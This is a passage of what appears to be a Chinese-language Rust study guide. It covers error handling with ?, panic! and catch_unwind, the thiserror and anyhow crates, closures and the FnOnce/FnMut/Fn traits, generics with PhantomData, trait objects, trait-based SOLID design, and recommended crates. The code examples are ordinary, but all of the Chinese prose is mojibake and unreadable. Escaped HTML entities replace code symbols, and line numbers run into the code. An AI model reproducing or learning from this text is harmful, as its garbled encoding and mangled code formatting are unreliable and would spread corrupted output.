‡æ³¨ï¼Œå¦‚æœè¯¥ç±»å‹å¯¹åº”çš„å€¼æ²¡æœ‰è¢«æ˜¾å¼ä½¿ç”¨ï¼Œç¼–è¯‘å™¨ä¼šæç¤ºã€‚ å¦‚æœä½ åªæƒ³ä¼ æ’­é”™è¯¯ï¼Œä¸æƒ³å°±åœ°å¤„ç†ï¼Œå¯ä»¥ç”¨ ? æ“ä½œç¬¦ã€‚ ? æ“ä½œç¬¦å†…éƒ¨è¢«å±•å¼€æˆç±»ä¼¼è¿™æ ·çš„ä»£ç ï¼š 1234match result &#123; Ok(v) =&gt; v, Err(e) =&gt; return Err(e.into())&#125; Rust è¿˜ä¸º Option å’Œ Result æä¾›äº†å¤§é‡çš„è¾…åŠ©å‡½æ•°ï¼Œå¦‚ map (å¤„ç†Okå’ŒSome) / map_err (å¤„ç† err) / and_then (å¤„ç† Okå’ŒSomeï¼ŒåŒæ—¶æ•è·æ–°çš„ Err)ã€‚ ä¸¥é‡çš„é”™è¯¯ ä½¿ç”¨ panic! å’Œ catch_unwind å¤„ç†ä¸å¯æ¢å¤æˆ–è€…ä¸æƒ³æ¢å¤çš„é”™è¯¯ã€‚æ¯”å¦‚ï¼Œå¦‚æœåè®®å˜é‡å†™é”™äº†ï¼Œæœ€ä½³çš„æ–¹å¼æ˜¯ç«‹åˆ» panic! å‡ºæ¥ï¼ˆå½“ç„¶è¿˜æ˜¯éœ€è¦è€ƒè™‘ç³»ç»Ÿæ˜¯å¦éœ€è¦å¿½ç•¥éƒ¨åˆ†é”™è¯¯ï¼‰ï¼Œè®©é”™è¯¯ç«‹åˆ»æš´éœ²ï¼Œä»¥ä¾¿è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ catch_unwind ä½œç”¨å’Œå…¶å®ƒè¯­è¨€çš„ try {â€¦} catch {â€¦} ä¸€æ ·ã€‚ 12345678910111213use std::panic;fn main() &#123; let result = panic::catch_unwind(|| &#123; println!(\"hello!\"); &#125;); assert!(result.is_ok()); let result = panic::catch_unwind(|| &#123; panic!(\"oh no!\"); // exception &#125;); assert!(result.is_err()); println!(\"panic captured: &#123;:#?&#125;\", result);&#125; å¦‚æœæŠŠ Rust ä»£ç æ•´ä¸ªå°è£…åœ¨ catch_unwind() å‡½æ•°æ‰€éœ€è¦ä¼ å…¥çš„é—­åŒ…ä¸­ã€‚ä¸€æ—¦ä»»ä½•ä»£ç ä¸­ï¼ŒåŒ…æ‹¬ç¬¬ä¸‰æ–¹ crates çš„ä»£ç ï¼Œå«æœ‰èƒ½å¤Ÿå¯¼è‡´ panic! çš„ä»£ç ï¼Œéƒ½ä¼šè¢«æ•è·ï¼Œå¹¶è¢«è½¬æ¢ä¸ºä¸€ä¸ª Resultã€‚ é”™è¯¯ç±»å‹è½¬æ¢ Rust å®šä¹‰äº† Error traitï¼š 123456pub trait Error: Debug + Display &#123; fn source(&amp;self) -&gt; Option&lt;&amp;(dyn Error + 'static)&gt; &#123; ... &#125; fn backtrace(&amp;self) -&gt; Option&lt;&amp;Backtrace&gt; &#123; ... &#125; fn description(&amp;self) -&gt; &amp;str &#123; ... &#125; fn cause(&amp;self) -&gt; Option&lt;&amp;dyn Error&gt; &#123; ... &#125;&#125; ä½¿ç”¨ thiserrorå’Œanyhow å¯ä»¥ç®€åŒ–è‡ªå®šä¹‰çš„é”™è¯¯ç±»å‹ã€‚ æ¯”å¦‚ä½¿ç”¨ thiserrorï¼š 12345678910111213141516use thiserror::Error;#[derive(Error, Debug)]#[non_exhaustive]pub enum DataStoreError &#123; #[error(\"data store disconnected\")] Disconnect(#[from] std::io::Error), #[error(\"the data for key `&#123;0&#125;` is not available\")] Redaction(String), #[error(\"invalid header (expected &#123;expected:?&#125;, found &#123;found:?&#125;)\")] InvalidHeader &#123; expected: String, found: String, &#125;, #[error(\"unknown data store error\")] Unknown,&#125; è€Œ anyhow å®ç°äº† anyhow::Error å’Œä»»æ„ç¬¦åˆ Error trait çš„é”™è¯¯ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼Œè®©ä½ å¯ä»¥ä½¿ç”¨ ? æ“ä½œç¬¦ï¼Œä¸å¿…å†æ‰‹å·¥è½¬æ¢é”™è¯¯ç±»å‹ã€‚anyhow è¿˜å¯ä»¥è®©ä½ å¾ˆå®¹æ˜“åœ°æŠ›å‡ºä¸€äº›ä¸´æ—¶çš„é”™è¯¯ï¼Œè€Œä¸å¿…è´¹åŠ›å®šä¹‰é”™è¯¯ç±»å‹ï¼Œä½†æ˜¯ä¸æå€¡æ»¥ç”¨è¿™ä¸ªèƒ½åŠ›ã€‚ é—­åŒ… é—­åŒ…æ˜¯ä¸€ç§åŒ¿åç±»å‹ï¼Œä¸€æ—¦å£°æ˜ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ç±»å‹ï¼Œä½†è¿™ä¸ªç±»å‹æ— æ³•è¢«å…¶å®ƒåœ°æ–¹ä½¿ç”¨ã€‚è¿™ä¸ªç±»å‹å°±åƒä¸€ä¸ªç»“æ„ä½“ï¼Œä¼šåŒ…å«æ‰€æœ‰æ•è·çš„å˜é‡ã€‚å…¶å¤§å°å’Œå†…éƒ¨çš„å±€éƒ¨å˜é‡å¤§å°æ— å…³ã€‚ æ•è·é¡ºåºï¼Œä¼šå½±å“é—­åŒ…ä¿å­˜å˜é‡çš„é¡ºåºã€‚ä½†æ˜¯ Rust ç¼–è¯‘å™¨ä¼šå¯¹ç»“æ„ä½“å†…å­˜è¿›è¡Œå†…å­˜ä¼˜åŒ–ï¼Œæ‰€ä»¥å®é™…ç¨‹åºä¸­å†…å­˜é¡ºåºï¼Œä¸ä¸€å®šæ˜¯ debug æ‰€æ˜¾å¼çš„é¡ºåºã€‚ é—­åŒ…æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šï¼ˆå’Œ Golang/Python/Java è¿™äº›ä¸åŒï¼Œå®ƒä»¬ä¼šç”³è¯·å †å†…å­˜ï¼‰ï¼Œå¹¶ä¸”é™¤äº†æ•è·çš„æ•°æ®å¤–ï¼Œé—­åŒ…æœ¬èº«ä¸åŒ…å«ä»»ä½•é¢å¤–å‡½æ•°æŒ‡é’ˆæŒ‡å‘é—­åŒ…çš„ä»£ç ã€‚ Golang/Python/Java è¿™äº›é—­åŒ…ï¼Œä¼šæœ‰é¢å¤–çš„å †å†…å­˜åˆ†é…ã€æ½œåœ¨çš„åŠ¨æ€åˆ†æ´¾ï¼ˆé—­åŒ…è¢«å¤„ç†æˆå‡½æ•°æŒ‡é’ˆï¼‰ã€é¢å¤–çš„å†…å­˜å›æ”¶ã€‚ ä½¿ç”¨äº† move ä¸” move åˆ°é—­åŒ…å†…çš„æ•°æ®ç»“æ„éœ€è¦æ»¡è¶³ Sendã€‚é—­åŒ…æ‹¥æœ‰æ•°æ®çš„æ‰€æœ‰æƒï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ 'staticã€‚ Rust çš„æ€§èƒ½å´å’Œä½¿ç”¨å‘½ä»¤å¼ç¼–ç¨‹çš„ C å‡ ä¹ä¸€æ ·ï¼Œé™¤äº†ç¼–è¯‘å™¨ä¼˜åŒ–çš„æ•ˆæœï¼Œä¹Ÿå› ä¸º Rust é—­åŒ…çš„æ€§èƒ½å’Œå‡½æ•°å·®ä¸å¤šã€‚ Rust é—­åŒ…çš„æ•ˆç‡éå¸¸é«˜ã€‚é¦–å…ˆé—­åŒ…æ•è·çš„å˜é‡ï¼Œéƒ½å‚¨å­˜åœ¨æ ˆä¸Šï¼Œæ²¡æœ‰å †å†…å­˜åˆ†é…ã€‚å…¶æ¬¡å› ä¸ºé—­åŒ…åœ¨åˆ›å»ºæ—¶ä¼šéšå¼åœ°åˆ›å»ºè‡ªå·±çš„ç±»å‹ï¼Œæ¯ä¸ªé—­åŒ…éƒ½æ˜¯ä¸€ä¸ªæ–°çš„ç±»å‹ã€‚é€šè¿‡é—­åŒ…è‡ªå·±å”¯ä¸€çš„ç±»å‹ï¼ŒRust ä¸éœ€è¦é¢å¤–çš„å‡½æ•°æŒ‡é’ˆæ¥è¿è¡Œé—­åŒ…ï¼Œæ‰€ä»¥é—­åŒ…çš„è°ƒç”¨æ•ˆç‡å’Œå‡½æ•°è°ƒç”¨å‡ ä¹ä¸€è‡´ã€‚ é—­åŒ…ç±»å‹ FnOnce å®šä¹‰å¦‚ä¸‹ï¼š 1234pub trait FnOnce&lt;Args&gt; &#123; type Output; extern \"rust-call\" fn call_once(self, args: Args) -&gt; Self::Output;&#125; FnOnce æœ‰ä¸€ä¸ªå…³è”ç±»å‹ Outputï¼Œæ˜¾ç„¶ï¼Œå®ƒæ˜¯é—­åŒ…è¿”å›å€¼çš„ç±»å‹ã€‚è¿˜æœ‰ä¸€ä¸ªæ–¹æ³• call_onceï¼Œè¦æ³¨æ„çš„æ˜¯ call_once ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ selfï¼Œå®ƒä¼šè½¬ç§» self çš„æ‰€æœ‰æƒåˆ° call_once å‡½æ•°ä¸­ã€‚æ‰€ä»¥å®ƒåªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚ FnMut å®šä¹‰å¦‚ä¸‹ï¼š 123456pub trait FnMut&lt;Args&gt;: FnOnce&lt;Args&gt; &#123; extern \"rust-call\" fn call_mut( &amp;mut self, args: Args ) -&gt; Self::Output;&#125; é¦–å…ˆï¼ŒFnMut â€œç»§æ‰¿â€äº† FnOnceï¼Œæˆ–è€…è¯´ FnOnce æ˜¯ FnMut çš„ super traitã€‚æ‰€ä»¥FnMutä¹Ÿæ‹¥æœ‰ Output è¿™ä¸ªå…³è”ç±»å‹å’Œ call_once è¿™ä¸ªæ–¹æ³•ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜æœ‰ä¸€ä¸ª call_mut() æ–¹æ³•ã€‚call_mut() ä¼ å…¥ &amp;mut selfï¼Œå®ƒä¸ç§»åŠ¨ selfï¼Œæ‰€ä»¥ FnMut å¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ã€‚ Fn å®šä¹‰å¦‚ä¸‹ï¼š 123pub trait Fn&lt;Args&gt;: FnMut&lt;Args&gt; &#123; extern \"rust-call\" fn call(&amp;self, args: Args) -&gt; Self::Output;&#125; å¯ä»¥çœ‹åˆ°ï¼Œå®ƒâ€œç»§æ‰¿â€äº† FnMutï¼Œæˆ–è€…è¯´ FnMut æ˜¯ Fn çš„ super traitã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ä»»ä½•éœ€è¦ FnOnce æˆ–è€… FnMut çš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼ å…¥æ»¡è¶³ Fn çš„é—­åŒ…ã€‚Fn ä¸å…è®¸ä¿®æ”¹é—­åŒ…çš„å†…éƒ¨æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œå¤šæ¬¡ã€‚ ç¤ºä¾‹ tonicï¼ˆRust ä¸‹çš„ gRPC åº“ï¼‰çš„ä¾‹å­ï¼š 12345678910111213pub trait Interceptor &#123; /// Intercept a request before it is sent, optionally cancelling it. fn call(&amp;mut self, request: crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt;;&#125;impl&lt;F&gt; Interceptor for Fwhere F: FnMut(crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt;,&#123; fn call(&amp;mut self, request: crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt; &#123; self(request) &#125;&#125; è¿™é‡Œä¸º F å®ç° Traitï¼ŒæŠŠ Request å’Œ é—­åŒ… F ç»Ÿä¸€èµ·æ¥è°ƒç”¨ã€‚ æ³›å‹æ•°æ®ç»“æ„ä½¿ç”¨ BufReader ä»£ç ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849pub struct BufReader&lt;R: ?Sized&gt; &#123; buf: Buffer, inner: R,&#125;impl&lt;R: Read&gt; BufReader&lt;R&gt; &#123; pub fn new(inner: R) -&gt; BufReader&lt;R&gt; &#123; BufReader::with_capacity(DEFAULT_BUF_SIZE, inner) &#125; pub fn with_capacity(capacity: usize, inner: R) -&gt; BufReader&lt;R&gt; &#123; BufReader &#123; inner, buf: Buffer::with_capacity(capacity) &#125; &#125;&#125;impl&lt;R: Read + ?Sized&gt; BufReader&lt;R&gt; &#123; pub fn peek(&amp;mut self, n: usize) -&gt; io::Result&lt;&amp;[u8]&gt; &#123;...&#125;&#125;impl&lt;R: ?Sized&gt; BufReader&lt;R&gt; &#123; pub fn get_ref(&amp;self) -&gt; &amp;R &#123; &amp;self.inner &#125; pub fn get_mut(&amp;mut self) -&gt; &amp;mut R &#123; &amp;mut self.inner &#125; pub fn buffer(&amp;self) -&gt; &amp;[u8] &#123; self.buf.buffer() &#125; pub fn into_inner(self) -&gt; R where R: Sized, &#123; self.inner &#125; pub(in crate::io) fn discard_buffer(&amp;mut self) &#123; self.buf.discard_buffer() &#125;&#125;impl&lt;R: ?Sized + Read&gt; Read for BufReader&lt;R&gt; &#123; fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; io::Result&lt;usize&gt; &#123;...&#125; ...&#125; æ ¹æ®ä¸åŒçš„çº¦æŸï¼Œåˆ†æˆäº†ä¸åŒçš„ä»£ç å—ã€‚ ä¸‰ç§å¸¸è§çš„ä½¿ç”¨åœºæ™¯ ä½¿ç”¨æ³›å‹å‚æ•°å»¶è¿Ÿæ•°æ®ç»“æ„çš„ç»‘å®šï¼› ä½¿ç”¨æ³›å‹å‚æ•°å’Œ PhantomDataï¼Œå£°æ˜æ•°æ®ç»“æ„ä¸­ä¸ç›´æ¥ä½¿ç”¨ï¼Œä½†åœ¨å®ç°è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°çš„ç±»å‹ã€‚PhantomData é•¿åº¦ä¸ºé›¶ï¼Œæ˜¯ä¸ª ZSTï¼ˆZero-Sized Typeï¼‰ï¼Œå°±åƒä¸å­˜åœ¨ä¸€æ ·ï¼Œå”¯ä¸€ä½œç”¨å°±æ˜¯ç±»å‹çš„æ ‡è®°ï¼› 123456789101112131415#[derive(Debug, Default, PartialEq, Eq)]pub struct Identifier&lt;T&gt; &#123; inner: u64, _tag: PhantomData&lt;T&gt;,&#125;#[derive(Debug, Default, PartialEq, Eq)]pub struct User &#123; id: Identifier&lt;Self&gt;,&#125;#[derive(Debug, Default, PartialEq, Eq)]pub struct Product &#123; id: Identifier&lt;Self&gt;,&#125; ä½¿ç”¨æ³›å‹å‚æ•°è®©åŒä¸€ä¸ªæ•°æ®ç»“æ„å¯¹åŒä¸€ä¸ª trait å¯ä»¥æ‹¥æœ‰ä¸åŒçš„å®ç°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637#[derive(Debug, Default)]pub struct Equation&lt;IterMethod&gt; &#123; current: u32, _method: PhantomData&lt;IterMethod&gt;,&#125;#[derive(Debug, Default)]pub struct Linear;#[derive(Debug, Default)]pub struct Quadratic;impl Iterator for Equation&lt;Linear&gt; &#123; type Item = u32; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; &#123; self.current += 1; if self.current &gt;= u32::MAX &#123; return None; &#125; Some(self.current) &#125;&#125;impl Iterator for Equation&lt;Quadratic&gt; &#123; type Item = u32; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; &#123; self.current += 1; if self.current &gt;= u16::MAX as u32 &#123; return None; &#125; Some(self.current * self.current) &#125;&#125; å¦å¤–ï¼š æ³›å‹å‚æ•°æ”¯æŒé»˜è®¤å€¼ï¼› impl Trait ä¸ &lt;Constrain: Trait&gt; æ˜¯ç›¸åŒçš„ï¼› åŠ¨æ€åˆ†é…çš„ trait object trait object æ˜¯ Rust å¤„ç†å¤šæ€çš„æ‰‹æ®µã€‚ 1234// è¿”å› trait objectpub fn trait_object_as_return_working(i: u32) -&gt; Box&lt;dyn Iterator&lt;Item = u32&gt;&gt; &#123; Box::new(std::iter::once(i))&#125; ä½¿ç”¨ trait object æ˜¯æœ‰é¢å¤–çš„ä»£ä»·çš„ï¼Œé¦–å…ˆè¿™é‡Œæœ‰ä¸€æ¬¡é¢å¤–çš„å †åˆ†é…ï¼Œå…¶æ¬¡åŠ¨æ€åˆ†æ´¾ä¼šå¸¦æ¥ä¸€å®šçš„æ€§èƒ½æŸå¤±ã€‚ å½“æˆ‘ä»¬åœ¨è¿è¡Œæ—¶æƒ³è®©æŸä¸ªå…·ä½“ç±»å‹ï¼Œåªè¡¨ç°å‡ºæŸä¸ª trait çš„è¡Œä¸ºï¼Œå¯ä»¥é€šè¿‡å°†å…¶èµ‹å€¼ç»™ä¸€ä¸ª dyn Tï¼Œæ— è®ºæ˜¯ &amp;dyn Tï¼Œè¿˜æ˜¯ Box&lt;dyn T&gt;ï¼Œè¿˜æ˜¯ Arc&lt;dyn T&gt;ã€‚æ­¤æ—¶ï¼ŒåŸæœ‰çš„ç±»å‹è¢«æŠ¹å»ï¼ŒRust ä¼šåˆ›å»ºä¸€ä¸ª trait objectï¼Œå¹¶ä¸ºå…¶åˆ†é…æ»¡è¶³è¯¥ trait çš„ vtableã€‚ åœ¨ç¼–è¯‘ dyn T æ—¶ï¼ŒRust ä¼šä¸ºä½¿ç”¨äº† trait object ç±»å‹çš„ trait å®ç°ï¼Œç”Ÿæˆç›¸åº”çš„ vtableï¼Œæ”¾åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼ˆä¸€èˆ¬åœ¨ TEXT æˆ– RODATA æ®µï¼‰ã€‚ å½“ trait object è°ƒç”¨ trait çš„æ–¹æ³•æ—¶ï¼Œå®ƒä¼šå…ˆä» vptr ä¸­æ‰¾åˆ°å¯¹åº”çš„ vtableï¼Œè¿›è€Œæ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•æ¥æ‰§è¡Œã€‚ 1234567891011121314151617181920pub type BoxedError = Box&lt;dyn Error + Send + Sync&gt;;pub trait Executor &#123; fn run(&amp;self) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt;;&#125;/// ä½¿ç”¨æ³›å‹å‚æ•°pub fn execute_generics(cmd: &amp;impl Executor) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125;/// ä½¿ç”¨ trait object: &amp;dyn Tpub fn execute_trait_object(cmd: &amp;dyn Executor) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125;/// ä½¿ç”¨ trait object: Box&lt;dyn T&gt;pub fn execute_boxed_trait_object(cmd: Box&lt;dyn Executor&gt;) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125; &amp;dyn Executor å’Œ Box æ˜¯ trait objectï¼Œå‰è€…åœ¨æ ˆä¸Šï¼Œåè€…åˆ†é…åœ¨å †ä¸Šã€‚ å­¦ä¹  Trait è®¾è®¡çš„å¼€æºåº“ ï¼šsnow snow-doc ç”¨ trait åšæ¡¥æ¥ 1234567891011121314// Engine traitï¼šæœªæ¥å¯ä»¥æ·»åŠ æ›´å¤šçš„ engineï¼Œä¸»æµç¨‹åªéœ€è¦æ›¿æ¢ enginepub trait Engine &#123; // å¯¹ engine æŒ‰ç…§ specs è¿›è¡Œä¸€ç³»åˆ—æœ‰åºçš„å¤„ç† fn apply(&amp;mut self, specs: &amp;[Spec]); // ä» engine ä¸­ç”Ÿæˆç›®æ ‡å›¾ç‰‡ï¼Œæ³¨æ„è¿™é‡Œç”¨çš„æ˜¯ selfï¼Œè€Œé self çš„å¼•ç”¨ fn generate(self, format: ImageOutputFormat) -&gt; Vec&lt;u8&gt;;&#125;// ä½¿ç”¨ image engine å¤„ç†let mut engine: Photon = data .try_into() .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;engine.apply(&amp;spec.specs);let image = engine.generate(ImageOutputFormat::Jpeg(85)); å¯è¯»æ€§ä¼˜åŒ– 12345678910111213141516171819202122232425262728293031// ä» Bytes è½¬æ¢æˆ Photon ç»“æ„impl TryFrom&lt;Bytes&gt; for Photon &#123; type Error = anyhow::Error; fn try_from(data: Bytes) -&gt; Result&lt;Self, Self::Error&gt; &#123; Ok(Self(open_image_from_bytes(&amp;data)?)) &#125;&#125;// Engine traitï¼šæœªæ¥å¯ä»¥æ·»åŠ æ›´å¤šçš„ engineï¼Œä¸»æµç¨‹åªéœ€è¦æ›¿æ¢ enginepub trait Engine &#123; // ç”Ÿæˆä¸€ä¸ªæ–°çš„ engine fn create&lt;T&gt;(data: T) -&gt; Result&lt;Self&gt; where Self: Sized, T: TryInto&lt;Self&gt;, &#123; data.try_into() .map_err(|_| anyhow!(\"failed to create engine\")) &#125; // å¯¹ engine æŒ‰ç…§ specs è¿›è¡Œä¸€ç³»åˆ—æœ‰åºçš„å¤„ç† fn apply(&amp;mut self, specs: &amp;[Spec]); // ä» engine ä¸­ç”Ÿæˆç›®æ ‡å›¾ç‰‡ï¼Œæ³¨æ„è¿™é‡Œç”¨çš„æ˜¯ selfï¼Œè€Œé self çš„å¼•ç”¨ fn generate(self, format: ImageOutputFormat) -&gt; Vec&lt;u8&gt;;&#125;// ä½¿ç”¨ image engine å¤„ç†let mut engine = Photon::create(data) .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;engine.apply(&amp;spec.specs);let image = engine.generate(ImageOutputFormat::Jpeg(85)); æ¡¥æ¥ä¹Ÿå¯ä»¥ç”¨æ¥éšè—å…·ä½“å®ç°ç»†èŠ‚ï¼š 1234567let secret_api = api_with_user_token(&amp;user, params);let data: Vec&lt;Status&gt; = reqwest::get(secret_api)?.json()?;// éšè— api è°ƒç”¨ç»†èŠ‚çš„ traitpub trait FriendCircle &#123; fn get_published(&amp;self, user: &amp;User) -&gt; Result&lt;Vec&lt;Status&gt;, FriendCircleError&gt;;&#125; ç”¨ trait ä½œä¸ºçº¦æŸåé¦ˆä¿¡æ¯ç»™ä¸Šå±‚ 123456789101112pub trait Engine &#123; // ç”Ÿæˆä¸€ä¸ªæ–°çš„ engine fn create&lt;T&gt;(data: T) -&gt; Result&lt;Self&gt; where Self: Sized, T: TryInto&lt;Self&gt;, // åªè¦ T å®ç°äº† TryInto&lt;Self&gt; å³å¯ &#123; data.try_into() .map_err(|_| anyhow!(\"failed to create engine\")) &#125; ...&#125; ç”¨ trait å®ç° SOLID SRPï¼šå•ä¸€èŒè´£åŸåˆ™ï¼Œæ˜¯æŒ‡æ¯ä¸ªæ¨¡å—åº”è¯¥åªè´Ÿè´£å•ä¸€çš„åŠŸèƒ½ï¼Œä¸åº”è¯¥è®©å¤šä¸ªåŠŸèƒ½è€¦åˆåœ¨ä¸€èµ·ï¼Œè€Œæ˜¯åº”è¯¥å°†å…¶ç»„åˆåœ¨ä¸€èµ·ã€‚ OCPï¼šå¼€é—­åŸåˆ™ï¼Œæ˜¯æŒ‡è½¯ä»¶ç³»ç»Ÿåº”è¯¥å¯¹ä¿®æ”¹å…³é—­ï¼Œè€Œå¯¹æ‰©å±•å¼€æ”¾ã€‚trait çš„ä¸åŒå®ç°ï¼Œæˆ–è€… trait çš„ç»§æ‰¿æ‰©å±•ã€‚ LSPï¼šé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œæ˜¯æŒ‡å¦‚æœç»„ä»¶å¯æ›¿æ¢ï¼Œé‚£ä¹ˆè¿™äº›å¯æ›¿æ¢çš„ç»„ä»¶åº”è¯¥éµå®ˆç›¸åŒçš„çº¦æŸï¼Œæˆ–è€…è¯´æ¥å£ã€‚æ¯”å¦‚ï¼Œä¸Šæ–‡ä¸­å®ç°äº† Engine trait çš„ engine å¯ä»¥è¿›è¡Œæ›¿æ¢ã€‚ ISPï¼šæ¥å£éš”ç¦»åŸåˆ™ï¼Œæ˜¯æŒ‡ä½¿ç”¨è€…åªéœ€è¦çŸ¥é“ä»–ä»¬æ„Ÿå…´è¶£çš„æ–¹æ³•ï¼Œè€Œä¸è¯¥è¢«è¿«äº†è§£å’Œä½¿ç”¨å¯¹ä»–ä»¬æ¥è¯´æ— ç”¨çš„æ–¹æ³•æˆ–è€…åŠŸèƒ½ã€‚ä¸€èˆ¬å½“ trait æ»¡è¶³ SRP å•ä¸€èŒè´£åŸåˆ™æ—¶ï¼Œå®ƒä¹Ÿæ»¡è¶³æ¥å£éš”ç¦»åŸåˆ™ DIPï¼šä¾èµ–åè½¬åŸåˆ™ï¼Œæ˜¯æŒ‡æŸäº›åœºåˆä¸‹åº•å±‚ä»£ç åº”è¯¥ä¾èµ–é«˜å±‚ä»£ç ï¼Œè€Œéé«˜å±‚ä»£ç å»ä¾èµ–åº•å±‚ä»£ç ã€‚ ç¤ºä¾‹ 1234567pub trait IntoIterator &#123; type Item; type IntoIter: Iterator&lt;Item = Self::Item&gt;; // åœ¨ä½¿ç”¨äº†å¼•ç”¨çš„åœºæ™¯ï¼Œè¿”å›å¯¹è±¡çš„æ‰€æœ‰æƒ fn into_iter(self) -&gt; Self::IntoIter;&#125; Service æ³¨å†Œï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pub struct ServiceInner&lt;Store&gt; &#123; store: Store, on_received: Vec&lt;fn(&amp;CommandRequest)&gt;, on_executed: Vec&lt;fn(&amp;CommandResponse)&gt;, on_before_send: Vec&lt;fn(&amp;mut CommandResponse)&gt;, on_after_send: Vec&lt;fn()&gt;,&#125;impl&lt;Store: Storage&gt; ServiceInner&lt;Store&gt; &#123; pub fn new(store: Store) -&gt; Self &#123; Self &#123; store, on_received: Vec::new(), on_executed: Vec::new(), on_before_send: Vec::new(), on_after_send: Vec::new(), &#125; &#125; pub fn fn_received(mut self, f: fn(&amp;CommandRequest)) -&gt; Self &#123; self.on_received.push(f); self &#125; pub fn fn_executed(mut self, f: fn(&amp;CommandResponse)) -&gt; Self &#123; self.on_executed.push(f); self &#125; pub fn fn_before_send(mut self, f: fn(&amp;mut CommandResponse)) -&gt; Self &#123; self.on_before_send.push(f); self &#125; pub fn fn_after_send(mut self, f: fn()) -&gt; Self &#123; self.on_after_send.push(f); self &#125;&#125;impl&lt;Store: Storage&gt; From&lt;ServiceInner&lt;Store&gt;&gt; for Service&lt;Store&gt; &#123; fn from(inner: ServiceInner&lt;Store&gt;) -&gt; Self &#123; Self &#123; inner: Arc::new(inner), &#125; &#125;&#125;let service: Service = ServiceInner::new(MemTable::default()) .fn_received(|_: &amp;CommandRequest| &#123;&#125;) .fn_received(b) .fn_executed(c) .fn_before_send(d) .fn_after_send(e) .into(); å¯å˜æ³›å‹ trait å’Œ ä¸å¯å˜æ³›å‹ traitï¼š 12345678910111213141516171819202122232425262728293031323334353637383940/// äº‹ä»¶é€šçŸ¥ï¼ˆä¸å¯å˜äº‹ä»¶ï¼‰pub trait Notify&lt;Arg&gt; &#123; fn notify(&amp;self, arg: &amp;Arg);&#125;/// äº‹ä»¶é€šçŸ¥ï¼ˆå¯å˜äº‹ä»¶ï¼‰pub trait NotifyMut&lt;Arg&gt; &#123; fn notify(&amp;self, arg: &amp;mut Arg);&#125;impl&lt;Arg&gt; Notify&lt;Arg&gt; for Vec&lt;fn(&amp;Arg)&gt; &#123; #[inline] fn notify(&amp;self, arg: &amp;Arg) &#123; for f in self &#123; f(arg) &#125; &#125;&#125;impl&lt;Arg&gt; NotifyMut&lt;Arg&gt; for Vec&lt;fn(&amp;mut Arg)&gt; &#123; #[inline] fn notify(&amp;self, arg: &amp;mut Arg) &#123; for f in self &#123; f(arg) &#125; &#125;&#125;impl&lt;Store: Storage&gt; Service&lt;Store&gt; &#123; pub fn execute(&amp;self, cmd: CommandRequest) -&gt; CommandResponse &#123; self.inner.on_received.notify(&amp;cmd); let mut res = dispatch(cmd, &amp;self.inner.store); self.inner.on_executed.notify(&amp;res); self.inner.on_before_send.notify(&amp;mut res); res &#125;&#125; ä¸‰æ–¹åº“æ¨è tonic / axum / tokio-uring / tokio-rustls / tokio-stream / tokio-util ç­‰ç½‘ç»œå’Œå¼‚æ­¥ IO åº“ bytes / tracing / mio / slab / serde / clap / structopt / indicatif / dialoguer / crossbeam / nom åŸºç¡€ç»„ä»¶åº“ hyper å¤„ç† http1/http2ï¼Œquinn / quiche å¤„ç† QUIC/http3ï¼Œtonic å¤„ç† gRPCï¼Œä»¥åŠ tungstenite / tokio-tungstenite å¤„ç† websocket avro-rs å¤„ç† apache avroï¼Œcapnp å¤„ç† Capâ€™n Protoï¼Œprost å¤„ç† protobufï¼Œflatbuffers å¤„ç† google flatbuffersï¼Œthrift å¤„ç† apache thrift actix-web / rocket / axum Web æ¡†æ¶ diesel / sea-orm ORMï¼Œsqlx SQL æ”¯æŒ jinja è¯­æ³•çš„ askamaï¼Œæœ‰ç±»ä¼¼ jinja2 çš„ teraï¼Œå¤„ç† markdown çš„ comrak çš„æ¨¡æ¿å¼•æ“ çº¯å‰ç«¯ yew å’Œ seedï¼Œå…¨æ ˆ MoonZoon Web æµ‹è¯• headless_chrome, thirtyfour å’Œ fantoccini é™æ€ç½‘ç«™ç”Ÿæˆé¢†åŸŸï¼Œå¯¹æ ‡ hugo çš„ zola å’Œå¯¹æ ‡ gitbook çš„ mdbook äº‘åŸç”Ÿ kube-rs WebAssembly wasm-pack, wasm-bindgen, wasmtime å’Œ rustwasm åµŒå…¥å¼å¼€å‘ embedded WGï¼ŒAwesome embedded rust æœºå™¨å­¦ä¹  tensorflow çš„ç»‘å®šï¼Œtch-rs libtorchï¼ˆPyTorchï¼‰çš„ç»‘å®šï¼Œå¯¹æ ‡ scikit-learn çš„ 